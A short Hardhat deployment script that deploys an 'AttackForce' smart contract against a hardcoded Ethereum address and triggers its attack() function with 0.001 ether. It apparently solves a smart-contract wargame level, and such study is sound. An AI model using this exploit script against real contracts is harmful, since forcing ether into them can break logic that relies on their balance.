
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {

  const Force = await hre.ethers.getContractFactory("AttackForce");
  const attack = await Force.deploy("0x4F5b94B9dE21dBDe75173a69175e30D9f4767b89");

  await attack.deployed();

  console.log("attack deployed to:", attack.address);

  let [user] = await ethers.getSigners();

  // const tx = await user.sendTransaction({
  //   from: user.address,
  //   to: attack.address,
  //   value: ethers.utils.parseEther("0.001"),
  //   gasLimit: 50000,
  // })

  // await tx.wait()

  const attacks = await attack.attack({
    value: ethers.utils.parseEther("0.001"),
  });
  console.log(attacks)
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
